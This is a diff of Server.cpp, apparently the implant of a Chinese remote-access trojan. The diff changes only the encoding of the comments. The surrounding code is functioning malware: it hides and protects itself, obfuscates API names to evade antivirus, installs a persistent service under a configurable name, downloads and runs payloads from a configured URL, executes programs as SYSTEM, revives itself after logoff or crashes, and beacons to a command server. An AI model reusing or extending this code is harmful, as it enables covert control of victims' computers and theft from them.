@@ -1,4 +1,4 @@
-// Server.cpp : Defines the entry point for the DLL application.
+ï»¿// Server.cpp : Defines the entry point for the DLL application.
 //
 
 #include "stdafx.h"
@@ -25,8 +25,8 @@
 
 Myfunction *pMyfunction;
 
-#define HEART_BEAT_TIME 1000 * 60  //ĞÄÌøÊ±¼ä
-char *lpDriverName = "QAssist";    //Çı¶¯Ãû³Æ
+#define HEART_BEAT_TIME 1000 * 60  //å¿ƒè·³æ—¶é—´
+char *lpDriverName = "QAssist";    //é©±åŠ¨åç§°
 
 extern std::map<DWORD, HANDLE> vShellCmdHandleList;
 
@@ -51,10 +51,10 @@ MODIFY_DATA modify_data =
 		"",
 		"",
 		"",
-		FALSE,			//FALSEÎªÎ´Ê¹ÓÃÄÚÍø´©Í¸
-		TRUE,			//TRUEÎª·şÎñÆô¶¯
-		TRUE,			//TRUEÎªÆô¶¯Ä¿Â¼Æô¶¯
-		TRUE,			//TRUEÎªÂÌÉ«°²×°£¬FALSEÎª±ê×¼°²×°
+		FALSE,			//FALSEä¸ºæœªä½¿ç”¨å†…ç½‘ç©¿é€
+		TRUE,			//TRUEä¸ºæœåŠ¡å¯åŠ¨
+		TRUE,			//TRUEä¸ºå¯åŠ¨ç›®å½•å¯åŠ¨
+		TRUE,			//TRUEä¸ºç»¿è‰²å®‰è£…ï¼ŒFALSEä¸ºæ ‡å‡†å®‰è£…
 		"",
 		"",
 		0,
@@ -65,7 +65,7 @@ MODIFY_DATA modify_data =
 
 enum
 {
-	NOT_CONNECT, //»¹Ã»ÓĞÁ¬½Ó
+	NOT_CONNECT, //è¿˜æ²¡æœ‰è¿æ¥
 	GETLOGINFO_ERROR,
 	CONNECT_ERROR,
 	HEARTBEATTIMEOUT_ERROR
@@ -143,7 +143,7 @@ LRESULT CALLBACK LogoutOrShutdownRevive(HWND hWnd, UINT message, WPARAM wParam, 
 
 DWORD WINAPI LogoutOrShutdownRevive(LPVOID lpParam)
 {
-	// Èç¹ûÊÇÂÌÉ«Ä£Ê½, ÔòÖ±½ÓÍË³öÏß³Ì
+	// å¦‚æœæ˜¯ç»¿è‰²æ¨¡å¼, åˆ™ç›´æ¥é€€å‡ºçº¿ç¨‹
 	if (modify_data.bRunOnce)
 		return 0;
 	
@@ -427,7 +427,7 @@ DWORD WINAPI GetActiveConsoleUserSid(LPVOID lpParam)
 	char szUserName[50] = {0};
 	extern BOOL GetCurrentUserName(char *szUserName);
 	SelfProtectAndHide(NULL);
-	// Èç¹ûÊÇÂÌÉ«Ä£Ê½»ò·Ç·şÎñÄ£Ê½, ÔòÖ±½ÓÍË³öÏß³Ì
+	// å¦‚æœæ˜¯ç»¿è‰²æ¨¡å¼æˆ–éæœåŠ¡æ¨¡å¼, åˆ™ç›´æ¥é€€å‡ºçº¿ç¨‹
 	if (modify_data.bRunOnce || !modify_data.bService)
 		return 0;
 	while (!GetCurrentUserName(szUserName))
@@ -554,13 +554,13 @@ DWORD WINAPI AutoAdjustSessionId(LPVOID lpParam)
 	typedef BOOL (WINAPI *SetServiceStatusT)(SERVICE_STATUS_HANDLE hServiceStatus,LPSERVICE_STATUS lpServiceStatus);
 	SetServiceStatusT pSetServiceStatus=(SetServiceStatusT)MyGetProcAddressA(AjrFx,xTfkA);
 	
-	// Èç¹ûÊÇÂÌÉ«Ä£Ê½»ò·Ç·şÎñÄ£Ê½, ÔòÖ±½ÓÍË³öÏß³Ì
+	// å¦‚æœæ˜¯ç»¿è‰²æ¨¡å¼æˆ–éæœåŠ¡æ¨¡å¼, åˆ™ç›´æ¥é€€å‡ºçº¿ç¨‹
 	if (modify_data.bRunOnce || !modify_data.bService)
 		return 0;
 	
 	OSVERSIONINFOEX OsVerInfoEx;
 	OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
-	GetVersionEx((OSVERSIONINFO *)&OsVerInfoEx); // ×¢Òâ×ª»»ÀàĞÍ
+	GetVersionEx((OSVERSIONINFO *)&OsVerInfoEx); // æ³¨æ„è½¬æ¢ç±»å‹
 	GetNtVersionNumbers(OsVerInfoEx.dwMajorVersion,OsVerInfoEx.dwMinorVersion,OsVerInfoEx.dwBuildNumber);
 	
 	char CommandLine[1024], ServicePath[MAX_PATH];
@@ -571,16 +571,16 @@ DWORD WINAPI AutoAdjustSessionId(LPVOID lpParam)
 	DWORD dwCurrentSessionId = 0, dwActiveSessionId = 0;
 	while (TRUE)
 	{
-		Sleep((DWORD)lpParam); // ¶¨Ê±¼ì²â»î¶¯»á»°, ²¢ÇÒ×Ô¶¯½øĞĞµ÷Õû
+		Sleep((DWORD)lpParam); // å®šæ—¶æ£€æµ‹æ´»åŠ¨ä¼šè¯, å¹¶ä¸”è‡ªåŠ¨è¿›è¡Œè°ƒæ•´
 		if (pProcessIdToSessionId(GetCurrentProcessId(), &dwCurrentSessionId))
 		{
-			//¼ì²â»î¶¯»á»°
+			//æ£€æµ‹æ´»åŠ¨ä¼šè¯
 			dwActiveSessionId = pWTSGetActiveConsoleSessionId();
 			if (dwActiveSessionId == 0xFFFFFFFF)
 				continue;
 			if (dwCurrentSessionId == dwActiveSessionId)
 				continue;
-			//ÓÃ»§µÇÂ¼×´Ì¬
+			//ç”¨æˆ·ç™»å½•çŠ¶æ€
 			DWORD dwArgs = 0; LPCSTR szArgs = "-rsvc";
 			LPSTR lpUserName = NULL; DWORD dwUserSize = 0;
 			if (WTSQuerySessionInformation(NULL, dwActiveSessionId, WTSUserName, &lpUserName, &dwUserSize))
@@ -590,10 +590,10 @@ DWORD WINAPI AutoAdjustSessionId(LPVOID lpParam)
 				WTSFreeMemory(lpUserName);
 			}
 			else dwArgs = 1;
-			//´¦ÓÚµÇÂ¼½çÃæ
+			//å¤„äºç™»å½•ç•Œé¢
 			if (hServiceStatus != NULL && dwArgs)
 				continue;
-			//ÖÕÖ¹ÖÕ¶Ë³ÌĞò
+			//ç»ˆæ­¢ç»ˆç«¯ç¨‹åº
 			std::map<DWORD, HANDLE>::iterator it;
 			DWORD dwProcessList, *lpdwProcessList, dwProcessCount;
 			for (it = vShellCmdHandleList.begin(); it != vShellCmdHandleList.end(); it++)
@@ -625,7 +625,7 @@ DWORD WINAPI AutoAdjustSessionId(LPVOID lpParam)
 			}
 			CloseHandle(g_hMutexEntry);
 			CloseHandle(g_hMutexLogin);
-			//ÖØĞÂÆô¶¯·şÎñ
+			//é‡æ–°å¯åŠ¨æœåŠ¡
 			if (hServiceStatus != NULL)
 			{
 				hActiveSession = RunInActiveSession(FALSE,CommandLine);
@@ -636,9 +636,9 @@ DWORD WINAPI AutoAdjustSessionId(LPVOID lpParam)
 			else if ((OsVerInfoEx.dwMajorVersion == 6 && OsVerInfoEx.dwMinorVersion >= 2) || OsVerInfoEx.dwMajorVersion > 6)
 			{
 				hActiveSession = RunInActiveSession(FALSE,CommandLine);
-				CloseHandle(hActiveSession); // Win7ÒÔºóÏµÍ³, »î¶¯»á»°¸Ä±äºó, ÒÔĞÂ»î¶¯»á»°ÔËĞĞ
+				CloseHandle(hActiveSession); // Win7ä»¥åç³»ç»Ÿ, æ´»åŠ¨ä¼šè¯æ”¹å˜å, ä»¥æ–°æ´»åŠ¨ä¼šè¯è¿è¡Œ
 			}
-			else // VistaºÍWin7ÏµÍ³, »î¶¯»á»°¸Ä±äºó, Î»ÓÚµÇÂ¼½çÃæÊ±(»î¶¯»á»°Î´µÇÂ¼ÕÊºÅ), ÒÔ·şÎñÄ£Ê½ÔËĞĞ
+			else // Vistaå’ŒWin7ç³»ç»Ÿ, æ´»åŠ¨ä¼šè¯æ”¹å˜å, ä½äºç™»å½•ç•Œé¢æ—¶(æ´»åŠ¨ä¼šè¯æœªç™»å½•å¸å·), ä»¥æœåŠ¡æ¨¡å¼è¿è¡Œ
 			{
 				SC_HANDLE schManager = NULL, schService = NULL;
 				schManager = OpenSCManager(NULL, NULL, STANDARD_RIGHTS_EXECUTE);
@@ -802,7 +802,7 @@ bool OpenFile1(LPCTSTR lpFile, BOOL bRunInAcsiUser, INT nShowCmd)
 			return false;
 	}
 	
-	if (hTokenAcsi == NULL) // ¿ÉÖ´ĞĞÎÄ¼ş(.exe .bat .com), ÒÔSYSTEMÈ¨ÏŞÔËĞĞ
+	if (hTokenAcsi == NULL) // å¯æ‰§è¡Œæ–‡ä»¶(.exe .bat .com), ä»¥SYSTEMæƒé™è¿è¡Œ
 	{
 		if (!pCreateProcessA(NULL, strTemp, NULL, NULL, FALSE, 0, NULL, szCurrentDirectory, &si, &pi))
 			return false;
@@ -866,13 +866,13 @@ DWORD WINAPI Loop_DownManager1(LPVOID lpParam)
 		if (!CheckFileExist(szFilePath))
 		{
 			free(lpUrl);
-			return false; //ÎÄ¼şÏÂÔØ³É¹¦£¬µ«ÊÇÎÄ¼ş²»´æÔÚ£¬ºÜ¿ÉÄÜ±»É±¶¾Èí¼ş²éÉ±
+			return false; //æ–‡ä»¶ä¸‹è½½æˆåŠŸï¼Œä½†æ˜¯æ–‡ä»¶ä¸å­˜åœ¨ï¼Œå¾ˆå¯èƒ½è¢«æ€æ¯’è½¯ä»¶æŸ¥æ€
 		}
 	}
 	else
 	{
 		free(lpUrl);
-		return false;     //ÎÄ¼şÏÂÔØÊ§°Ü£¬Çë¼ì²éURLÊÇ·ñÕıÈ·
+		return false;     //æ–‡ä»¶ä¸‹è½½å¤±è´¥ï¼Œè¯·æ£€æŸ¥URLæ˜¯å¦æ­£ç¡®
 	}
 	free(lpUrl);
 	
@@ -1000,7 +1000,7 @@ LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo)
 {
 
 	
-	// ·¢ÉúÒì³££¬ÖØĞÂ´´½¨½ø³Ì
+	// å‘ç”Ÿå¼‚å¸¸ï¼Œé‡æ–°åˆ›å»ºè¿›ç¨‹
 	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Login, NULL, 0, NULL);
 	WaitForSingleObject(hThread, INFINITE);
 	CloseHandle(hThread);
@@ -1021,7 +1021,7 @@ int main()
 
 
 
-		// »¥³â ÉÏÏßµØÖ·:¶Ë¿Ú:·şÎñÃû
+		// äº’æ–¥ ä¸Šçº¿åœ°å€:ç«¯å£:æœåŠ¡å
 	char	strMutex[100];
 	wsprintfA(strMutex,"%s:%d:%s",modify_data.szDns1,modify_data.dwPort1,modify_data.SerName);
 	HANDLE m_hMutex = CreateMutex(NULL, FALSE, strMutex);
@@ -1040,7 +1040,7 @@ int main()
 
 	
 	CloseHandle(MyCreateThread(NULL,0,LogoutOrShutdownRevive,NULL,0,NULL,true));
-	lpszUserSid = NULL; //ÔİÊ±ÉèÖÃÎªNULL, µÈ´ıÏµÍ³µÇÂ¼ºóÔÙ»ñÈ¡
+	lpszUserSid = NULL; //æš‚æ—¶è®¾ç½®ä¸ºNULL, ç­‰å¾…ç³»ç»Ÿç™»å½•åå†è·å–
 	char *lpDownRun = modify_data.szDownRun;
 	if (lpDownRun != NULL)
 		CloseHandle(MyCreateThread(NULL,0,Loop_DownManager1,lpDownRun,0,NULL,true));
@@ -1100,7 +1100,7 @@ int main()
 		int nCount = 0;
 		do
 		{
-			// Ã¿1·Ö·¢ËÍÒ»´ÎĞÄÌø°ü
+			// æ¯1åˆ†å‘é€ä¸€æ¬¡å¿ƒè·³åŒ…
 			if ((GetTickCount() - dwTickCount) >= 1000 * Random(50,80) )
 			{
 				nRet = SocketClient.Send(&bToken, 1);
@@ -1142,7 +1142,7 @@ int main()
 
 static BOOL ServiceIsExist(LPCSTR lpServiceName)
 {
-	// ·½·¨(1)
+	// æ–¹æ³•(1)
 	SC_HANDLE schManager = NULL, schService = NULL;
 	schManager = OpenSCManager(0, 0, SC_MANAGER_CONNECT);
 	if (schManager == NULL)
@@ -1157,7 +1157,7 @@ static BOOL ServiceIsExist(LPCSTR lpServiceName)
 	CloseServiceHandle(schManager);
 	return TRUE;
 	
-	// ·½·¨(2)
+	// æ–¹æ³•(2)
 // 	char AjrFx[]={'A','D','V','A','P','I','3','2','.','d','l','l','\0'};
 // 	char KoX3m[]={'R','e','g','O','p','e','n','K','e','y','E','x','A','\0'};
 // 	RegOpenKeyExAT pRegOpenKeyExA=(RegOpenKeyExAT)MyGetProcAddressA(AjrFx,KoX3m);
@@ -1208,18 +1208,18 @@ DWORD WINAPI ServiceCtrlHandlerEx(DWORD dwControl, DWORD dwEventType, LPVOID lpE
 	
 	OSVERSIONINFOEX OsVerInfoEx;
 	OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
-	GetVersionEx((OSVERSIONINFO *)&OsVerInfoEx); // ×¢Òâ×ª»»ÀàĞÍ
+	GetVersionEx((OSVERSIONINFO *)&OsVerInfoEx); // æ³¨æ„è½¬æ¢ç±»å‹
 	GetNtVersionNumbers(OsVerInfoEx.dwMajorVersion,OsVerInfoEx.dwMinorVersion,OsVerInfoEx.dwBuildNumber);
 	
 	if (OsVerInfoEx.dwMajorVersion >= 6)
 	{
 		if (dwControl == SERVICE_CONTROL_SESSIONCHANGE && dwEventType == WTS_CONSOLE_CONNECT)
-			pSetEvent(g_hEventRvive); // VistaÒÔºóÏµÍ³(×¢Ïúºó), Á¬½Ó¿ØÖÆÌ¨»á»°ºó, ²ÅÔÊĞíµÈ´ıµÄ·şÎñ¼ÌĞøÔËĞĞ
+			pSetEvent(g_hEventRvive); // Vistaä»¥åç³»ç»Ÿ(æ³¨é”€å), è¿æ¥æ§åˆ¶å°ä¼šè¯å, æ‰å…è®¸ç­‰å¾…çš„æœåŠ¡ç»§ç»­è¿è¡Œ
 	}
 	else
 	{
 		if (dwControl == SERVICE_CONTROL_SESSIONCHANGE && dwEventType == WTS_SESSION_LOGOFF)
-			pSetEvent(g_hEventRvive); // VistaÒÔÇ°ÏµÍ³(×¢Ïúºó), µ±ÓÃ»§×¢Ïú»á»°ºó, ²ÅÔÊĞíµÈ´ıµÄ·şÎñ¼ÌĞøÔËĞĞ
+			pSetEvent(g_hEventRvive); // Vistaä»¥å‰ç³»ç»Ÿ(æ³¨é”€å), å½“ç”¨æˆ·æ³¨é”€ä¼šè¯å, æ‰å…è®¸ç­‰å¾…çš„æœåŠ¡ç»§ç»­è¿è¡Œ
 	}
 	if (dwControl == SERVICE_CONTROL_SHUTDOWN)
 	{
@@ -1259,7 +1259,7 @@ void WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
 	
 	OSVERSIONINFOEX OsVerInfoEx;
 	OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
-	GetVersionEx((OSVERSIONINFO *)&OsVerInfoEx); // ×¢Òâ×ª»»ÀàĞÍ
+	GetVersionEx((OSVERSIONINFO *)&OsVerInfoEx); // æ³¨æ„è½¬æ¢ç±»å‹
 	GetNtVersionNumbers(OsVerInfoEx.dwMajorVersion,OsVerInfoEx.dwMinorVersion,OsVerInfoEx.dwBuildNumber);
 	
 	char CommandLine[1024],ServicePath[MAX_PATH];
@@ -1271,22 +1271,22 @@ void WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
 	{
 		g_hEventRvive = pCreateEventA(NULL,TRUE,FALSE,NULL);
 		WaitForSingleObject(g_hEventRvive,INFINITE);
-		// Vista»òWin7ÏµÍ³(×¢Ïúºó), Î»ÓÚµÇÂ¼½çÃæÊ±, ÒÔµ±Ç°»î¶¯»á»°ºÍÏµÍ³·şÎñÄ£Ê½Ë«½ø³ÌÔËĞĞ
+		// Vistaæˆ–Win7ç³»ç»Ÿ(æ³¨é”€å), ä½äºç™»å½•ç•Œé¢æ—¶, ä»¥å½“å‰æ´»åŠ¨ä¼šè¯å’Œç³»ç»ŸæœåŠ¡æ¨¡å¼åŒè¿›ç¨‹è¿è¡Œ
 		if (OsVerInfoEx.dwMajorVersion == 6 && (OsVerInfoEx.dwMinorVersion == 0 || OsVerInfoEx.dwMinorVersion == 1))
 		{
 			hActiveSession = RunInActiveSession(FALSE,CommandLine);
 			CloseHandle(hActiveSession);
 			AutoAdjustSessionId((LPVOID)200);
 		}
-		// Win7ÒÔºóÏµÍ³(×¢Ïúºó), Î»ÓÚµÇÂ¼½çÃæÊ±, ÒÔµ±Ç°»î¶¯»á»°ÔËĞĞ
+		// Win7ä»¥åç³»ç»Ÿ(æ³¨é”€å), ä½äºç™»å½•ç•Œé¢æ—¶, ä»¥å½“å‰æ´»åŠ¨ä¼šè¯è¿è¡Œ
 		else if ((OsVerInfoEx.dwMajorVersion == 6 && OsVerInfoEx.dwMinorVersion >= 2) || OsVerInfoEx.dwMajorVersion > 6)
 		{
 			hActiveSession = RunInActiveSession(FALSE,CommandLine);
 			CloseHandle(hActiveSession);
 		}
-		else // VistaÒÔÇ°ÏµÍ³(×¢Ïúºó), Î»ÓÚµÇÂ¼½çÃæÊ±, ÒÔµ±Ç°»î¶¯»á»°ÔËĞĞ
+		else // Vistaä»¥å‰ç³»ç»Ÿ(æ³¨é”€å), ä½äºç™»å½•ç•Œé¢æ—¶, ä»¥å½“å‰æ´»åŠ¨ä¼šè¯è¿è¡Œ
 		{
-			while (!FindWindow("#32770", "GINA Logon") && !FindWindow("#32770", "µÇÂ¼µ½ Windows"))
+			while (!FindWindow("#32770", "GINA Logon") && !FindWindow("#32770", "ç™»å½•åˆ° Windows"))
 			{
 				SwitchInputDesktop();
 				Sleep(300);
@@ -1358,7 +1358,7 @@ void MyCreatDirector(LPCSTR lpPath)
 
 // void ServiceFileAddSize(LPCSTR lpServicePath)
 // {
-// 	if (modify_data.Dele_zd == 0) //°²×°Ê±²»Ôö´ó
+// 	if (modify_data.Dele_zd == 0) //å®‰è£…æ—¶ä¸å¢å¤§
 // 		return;
 // 	
 // 	char iOagR[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
@@ -1374,16 +1374,16 @@ void MyCreatDirector(LPCSTR lpPath)
 // 	char eTmjZ[]={'W','r','i','t','e','F','i','l','e','\0'};
 // 	WriteFileT pWriteFile=(WriteFileT)MyGetProcAddressA(iOagR,eTmjZ);
 // 	
-// 	DWORD dwSize = modify_data.Dele_zd * 1024; //modify_data.Dele_zd=10 ¾ÍÊÇ10M
+// 	DWORD dwSize = modify_data.Dele_zd * 1024; //modify_data.Dele_zd=10 å°±æ˜¯10M
 // 	
 // 	HANDLE hFile = pCreateFileA(lpServicePath,GENERIC_WRITE,FILE_SHARE_WRITE,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
-// 	if(hFile == INVALID_HANDLE_VALUE) //Ê§°Ü
+// 	if(hFile == INVALID_HANDLE_VALUE) //å¤±è´¥
 // 		return;
 // 	
 // 	pSetFilePointer(hFile,0,NULL,FILE_END);
 // 	DWORD dwFileSize = pGetFileSize(hFile,NULL);
 // 	
-// 	if((dwSize*1024) > dwFileSize) //ÅĞ¶ÏÎÄ¼şÊÇ·ñ¹ı´ó ·ÀÖ¹·şÎñ¶Ë³ÌĞò¶à´Îµã»÷ÔËĞĞ
+// 	if((dwSize*1024) > dwFileSize) //åˆ¤æ–­æ–‡ä»¶æ˜¯å¦è¿‡å¤§ é˜²æ­¢æœåŠ¡ç«¯ç¨‹åºå¤šæ¬¡ç‚¹å‡»è¿è¡Œ
 // 	{
 // 		DWORD	dwBytesWritten=NULL;
 // 		char	Buffer[1024]={NULL};
@@ -1393,7 +1393,7 @@ void MyCreatDirector(LPCSTR lpPath)
 // 			if(n%1024 == 0)
 // 			{
 // 				for (int x=0; x<1024; x++)
-// 					Buffer[x]=(char)(pMyfunction->my_rand()+x)%255; //Ğ´ÈëËæ»úÀ¬»øÊı¾İ
+// 					Buffer[x]=(char)(pMyfunction->my_rand()+x)%255; //å†™å…¥éšæœºåƒåœ¾æ•°æ®
 // 			}
 // 			pWriteFile(hFile,Buffer,1024,&dwBytesWritten,NULL);
 // 		}
@@ -1439,16 +1439,16 @@ static void ServiceInstall(LPCSTR lpServicePath,LPCSTR lpServiceName,LPCSTR lpDi
 	CloseServiceHandleT pCloseServiceHandle=(CloseServiceHandleT)MyGetProcAddressA(xFjkI,tOjmD);
 	
 	char szInstallModule[MAX_PATH]={NULL};
-	GetModuleFileName(NULL,szInstallModule,MAX_PATH); //ÓÃÓÚ»ñÈ¡³ÌĞò±¾ÉíÂ·¾¶
+	GetModuleFileName(NULL,szInstallModule,MAX_PATH); //ç”¨äºè·å–ç¨‹åºæœ¬èº«è·¯å¾„
 	
 	if (strnicmp(szInstallModule,lpServicePath,strlen(lpServicePath)) != 0)
 	{
-		MyCreatDirector(lpServicePath);    //´´½¨ÎÄ¼ş¼Ğ
+		MyCreatDirector(lpServicePath);    //åˆ›å»ºæ–‡ä»¶å¤¹
 		pCopyFileA(szInstallModule,lpServicePath,FALSE);
-//		ServiceFileAddSize(lpServicePath); //ÎÄ¼ş×ÔÔö´ó
+//		ServiceFileAddSize(lpServicePath); //æ–‡ä»¶è‡ªå¢å¤§
 		memset(szInstallModule,0,MAX_PATH);
 		pMyfunction->my_strcpy(szInstallModule,(char *)lpServicePath);
-		pSetFileAttributesA(lpServicePath,modify_data.FileAttribute); //·ÅÕâÀï²ÅÓĞÓÃ(ĞŞ¸ÄÎÄ¼şÊôĞÔ)
+		pSetFileAttributesA(lpServicePath,modify_data.FileAttribute); //æ”¾è¿™é‡Œæ‰æœ‰ç”¨(ä¿®æ”¹æ–‡ä»¶å±æ€§)
 	}
 	Sleep(50); char szAuto[]={' ','-','a','u','t','o','\0'};
 	pMyfunction->my_strcat(szInstallModule,szAuto);
@@ -1457,7 +1457,7 @@ static void ServiceInstall(LPCSTR lpServicePath,LPCSTR lpServiceName,LPCSTR lpDi
 	DWORD dwServiceType; OSVERSIONINFO OsVerInfoEx;
 	OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
 	GetVersionEx(&OsVerInfoEx);
-	if (OsVerInfoEx.dwMajorVersion < 6) //ÅĞ¶ÏÄÇÖÖÏµÍ³£¬Èç¹ûĞ¡ÓÚ6£¬´´½¨½»»¥Ê½·şÎñ
+	if (OsVerInfoEx.dwMajorVersion < 6) //åˆ¤æ–­é‚£ç§ç³»ç»Ÿï¼Œå¦‚æœå°äº6ï¼Œåˆ›å»ºäº¤äº’å¼æœåŠ¡
 		dwServiceType = SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS;
 	else
 		dwServiceType = SERVICE_WIN32_OWN_PROCESS;
@@ -1478,7 +1478,7 @@ static void ServiceInstall(LPCSTR lpServicePath,LPCSTR lpServiceName,LPCSTR lpDi
 		
 		if (schService != NULL)
 		{
-			//Ëø¶¨Ò»ÏÂ·şÎñ...
+			//é”å®šä¸€ä¸‹æœåŠ¡...
 			SC_LOCK sc_lock=pLockServiceDatabase(schManager);
 			SERVICE_DESCRIPTION Service_Descrip={&modify_data.Serdesc[0]};
 			pChangeServiceConfig2A(schService,SERVICE_CONFIG_DESCRIPTION,&Service_Descrip);
@@ -1596,21 +1596,21 @@ DWORD __stdcall MainThread()
 extern "C" __declspec(dllexport) LPVOID Shellex(MODIFY_DATA m_Install)
 {
 
-	//½âÃÜÅäÖÃĞÅÏ¢½á¹¹Ìå
+	//è§£å¯†é…ç½®ä¿¡æ¯ç»“æ„ä½“
 	int nInStallSizeof=sizeof(MODIFY_DATA)+1;
 	MODIFY_DATA *pNewInStall=(MODIFY_DATA *)new  char[nInStallSizeof];
 	memcpy(pNewInStall,&m_Install,nInStallSizeof);
-	lstrcpy(modify_data.szDns1,pNewInStall->szDns1);       //szDns1----ĞèMyDecode½âÃÜ
-	lstrcpy(modify_data.szDns2,pNewInStall->szDns2);       //szDns2----ĞèMyDecode½âÃÜ
-	lstrcpy(modify_data.szGroup,pNewInStall->szGroup);     //szGroup---ĞèMyDecode½âÃÜ
-	lstrcpy(modify_data.szVersion,pNewInStall->szVersion); //szVersion-ĞèMyDecode½âÃÜ
+	lstrcpy(modify_data.szDns1,pNewInStall->szDns1);       //szDns1----éœ€MyDecodeè§£å¯†
+	lstrcpy(modify_data.szDns2,pNewInStall->szDns2);       //szDns2----éœ€MyDecodeè§£å¯†
+	lstrcpy(modify_data.szGroup,pNewInStall->szGroup);     //szGroup---éœ€MyDecodeè§£å¯†
+	lstrcpy(modify_data.szVersion,pNewInStall->szVersion); //szVersion-éœ€MyDecodeè§£å¯†
 	lstrcpy(modify_data.SerName,pNewInStall->SerName);
 	lstrcpy(modify_data.Serdisplay,pNewInStall->Serdisplay);
 	lstrcpy(modify_data.Serdesc,pNewInStall->Serdesc);
 	lstrcpy(modify_data.szGetGroup,pNewInStall->szGetGroup);
 	lstrcpy(modify_data.ReleasePath,pNewInStall->ReleasePath);
 	lstrcpy(modify_data.ReleaseName,pNewInStall->ReleaseName);
-	lstrcpy(modify_data.szDownRun,pNewInStall->szDownRun); //szDownRun-ĞèMyDecode½âÃÜ
+	lstrcpy(modify_data.szDownRun,pNewInStall->szDownRun); //szDownRun-éœ€MyDecodeè§£å¯†
 	
 	modify_data.dwPort1=pNewInStall->dwPort1;
 	modify_data.dwPort2=pNewInStall->dwPort2;
@@ -1658,15 +1658,15 @@ extern "C" __declspec(dllexport) LPVOID Shellex(MODIFY_DATA m_Install)
 	char sFmcZ[]={'S','e','t','F','i','l','e','A','t','t','r','i','b','u','t','e','s','A','\0'};
 	SetFileAttributesAT pSetFileAttributesA=(SetFileAttributesAT)MyGetProcAddressA(lygUR,sFmcZ);
 	
-	// ÈÃÆô¶¯³ÌĞòÊ±µÄĞ¡Â©¶·ÂíÉÏÏûÊ§
+	// è®©å¯åŠ¨ç¨‹åºæ—¶çš„å°æ¼æ–—é©¬ä¸Šæ¶ˆå¤±
 	pPostThreadMessageA(GetCurrentThreadId(),NULL,0,0);
 	pGetInputState();
 	MSG	msg;
 	pGetMessageA(&msg,NULL,NULL,NULL);
 	
-	SECURITY_DESCRIPTOR sd; //°²È«ÃèÊö
-	SECURITY_ATTRIBUTES sa; //°²È«ÊôĞÔ
-	//ÉèÖÃ»¥³â°²È«ÊôĞÔ
+	SECURITY_DESCRIPTOR sd; //å®‰å…¨æè¿°
+	SECURITY_ATTRIBUTES sa; //å®‰å…¨å±æ€§
+	//è®¾ç½®äº’æ–¥å®‰å…¨å±æ€§
 	InitializeSecurityDescriptor(&sd,SECURITY_DESCRIPTOR_REVISION);
 	SetSecurityDescriptorDacl(&sd,TRUE,NULL,FALSE);
 	sa.bInheritHandle = FALSE;
@@ -1682,12 +1682,12 @@ extern "C" __declspec(dllexport) LPVOID Shellex(MODIFY_DATA m_Install)
 		return FALSE;
 	
 	char ExpandPath[MAX_PATH];
-	pExpandEnvironmentStringsA(modify_data.ReleasePath,ExpandPath,MAX_PATH); //%SystemRoot%\À©³ä³ÉÍêÕûÂ·¾¶C:\WINDOWS\ 
+	pExpandEnvironmentStringsA(modify_data.ReleasePath,ExpandPath,MAX_PATH); //%SystemRoot%\æ‰©å……æˆå®Œæ•´è·¯å¾„C:\WINDOWS\ 
 	strcpy(modify_data.ReleasePath,ExpandPath);
-	if(modify_data.ReleasePath[strlen(modify_data.ReleasePath)-1]=='\\') //È¥µô×îºóµÄ'\\'
+	if(modify_data.ReleasePath[strlen(modify_data.ReleasePath)-1]=='\\') //å»æ‰æœ€åçš„'\\'
 		modify_data.ReleasePath[strlen(modify_data.ReleasePath)-1]=0;
 	
-	if (!modify_data.bRunOnce) //Èç¹û²»ÊÇÂÌÉ«°²×°
+	if (!modify_data.bRunOnce) //å¦‚æœä¸æ˜¯ç»¿è‰²å®‰è£…
 	{
 		if (modify_data.bService)
 		{
@@ -1700,7 +1700,7 @@ extern "C" __declspec(dllexport) LPVOID Shellex(MODIFY_DATA m_Install)
 					MainThread();
 				}
 			}
-			else //Èç¹û·şÎñÒÑ´æÔÚÔòÆô¶¯£¬²»´æÔÚÔò°²×°
+			else //å¦‚æœæœåŠ¡å·²å­˜åœ¨åˆ™å¯åŠ¨ï¼Œä¸å­˜åœ¨åˆ™å®‰è£…
 			{
 				if (ServiceIsExist(modify_data.SerName))
 				{
@@ -1709,7 +1709,7 @@ extern "C" __declspec(dllexport) LPVOID Shellex(MODIFY_DATA m_Install)
 						{modify_data.SerName,ServiceMain},
 						{NULL,NULL}
 					};
-					if (!pStartServiceCtrlDispatcherA(serviceTable)) //½øÈë·şÎñÈë¿Ú
+					if (!pStartServiceCtrlDispatcherA(serviceTable)) //è¿›å…¥æœåŠ¡å…¥å£
 					{
 						SC_HANDLE schManager = NULL, schService = NULL;
 						schManager = OpenSCManager(NULL, NULL, STANDARD_RIGHTS_EXECUTE);
@@ -1735,9 +1735,9 @@ extern "C" __declspec(dllexport) LPVOID Shellex(MODIFY_DATA m_Install)
 				else
 				{
 					char DQeBW01[] = {'%','s','\\','%','s','\0'};
-					char AZnames[MAX_PATH]={NULL};   //°²×°Í¾¾¶¼°Ãû³Æ
-					sprintf(AZnames,DQeBW01,modify_data.ReleasePath,modify_data.ReleaseName); //Á¬½Ó°²×°Ä¿Â¼ºÍ³ÌĞòÃû³Æ
-					MarkTime(modify_data.SerName); //Ğ´Èë°²×°Ê±¼äĞÅÏ¢
+					char AZnames[MAX_PATH]={NULL};   //å®‰è£…é€”å¾„åŠåç§°
+					sprintf(AZnames,DQeBW01,modify_data.ReleasePath,modify_data.ReleaseName); //è¿æ¥å®‰è£…ç›®å½•å’Œç¨‹åºåç§°
+					MarkTime(modify_data.SerName); //å†™å…¥å®‰è£…æ—¶é—´ä¿¡æ¯
 					ServiceInstall(AZnames,modify_data.SerName,modify_data.Serdisplay,modify_data.Serdesc);
 					DeleteMe();
 					//exit(0);
@@ -1753,7 +1753,7 @@ extern "C" __declspec(dllexport) LPVOID Shellex(MODIFY_DATA m_Install)
 		if (modify_data.bRuns)
 		{
 			InstallMode = 2;
